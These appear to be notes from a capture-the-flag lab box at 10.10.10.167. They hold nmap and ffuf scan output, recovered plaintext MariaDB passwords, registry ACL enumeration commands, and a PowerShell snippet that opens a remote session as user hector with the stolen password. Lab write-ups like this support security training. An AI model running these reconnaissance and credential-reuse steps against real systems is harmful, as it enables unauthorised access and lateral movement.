IP: 10.10.10.167

Nmap (nmap -sC -sV -Pn 10.10.10.167)
```bash
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Fidelity
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc   Microsoft Windows RPC
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.10' is not allowed to connect to this MariaDB server

```

Nmap (nmap -p- 10.10.10.167)
```bash
80/tcp    open  http
135/tcp   open  msrpc
3306/tcp  open  mysql
49666/tcp open  unknown
49667/tcp open  unknown
```

ffuf (ffuf -u 'http://10.10.10.167/FUZZ' -w raft-large-words.txt -e .php,.txt)
```bash
images                  [Status: 301, Size: 150, Words: 9, Lines: 2]                                               [2/131]
admin.php               [Status: 200, Size: 89, Words: 15, Lines: 1]                                                      
index.php               [Status: 200, Size: 3145, Words: 157, Lines: 89]                                                  
LICENSE.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64]
uploads                 [Status: 301, Size: 151, Words: 9, Lines: 2]
assets                  [Status: 301, Size: 150, Words: 9, Lines: 2]
about.php               [Status: 200, Size: 7867, Words: 529, Lines: 187]
database.php            [Status: 200, Size: 0, Words: 1, Lines: 1]
Admin.php               [Status: 200, Size: 89, Words: 15, Lines: 1]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2]
.                       [Status: 200, Size: 3145, Words: 157, Lines: 89]
license.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64]
ADMIN.php               [Status: 200, Size: 89, Words: 15, Lines: 1]
Assets                  [Status: 301, Size: 150, Words: 9, Lines: 2]
Uploads                 [Status: 301, Size: 151, Words: 9, Lines: 2]
About.php               [Status: 200, Size: 7867, Words: 529, Lines: 187]
Database.php            [Status: 200, Size: 0, Words: 1, Lines: 1]
Index.php               [Status: 200, Size: 3145, Words: 157, Lines: 89]
IMAGES                  [Status: 301, Size: 150, Words: 9, Lines: 2]
License.txt             [Status: 200, Size: 17128, Words: 2798, Lines: 64]
DataBase.php            [Status: 200, Size: 0, Words: 1, Lines: 1]
search_products.php     [Status: 200, Size: 88, Words: 15, Lines: 1]
ABOUT.php               [Status: 200, Size: 7867, Words: 529, Lines: 187]
UPLOADS                 [Status: 301, Size: 151, Words: 9, Lines: 2]
ASSETS                  [Status: 301, Size: 150, Words: 9, Lines: 2]
INDEX.php               [Status: 200, Size: 3145, Words: 157, Lines: 89]
DATABASE.php            [Status: 200, Size: 0, Words: 1, Lines: 1]
AdMin.php               [Status: 200, Size: 89, Words: 15, Lines: 1]
UpLoads                 [Status: 301, Size: 151, Words: 9, Lines: 2]
admiN.php               [Status: 200, Size: 89, Words: 15, Lines: 1]
```

index.php interesting sourcecode comment:
```
<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
```

Mysql password for manager@localhost:
manager : l3tm3!n
hector : l33th4x0rhector

Paths:
```
C:\Program Files\MariaDB 10.4\

```

get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

WpnU
ws2i
WSea

$username = "CONTROL\hector"
$password = convertto-securestring -asplaintext -force "l33th4x0rhector"
$credentials = new-object system.management.automation.pscredential $username,$password
enter-pssession -computername localhost -credential $credentials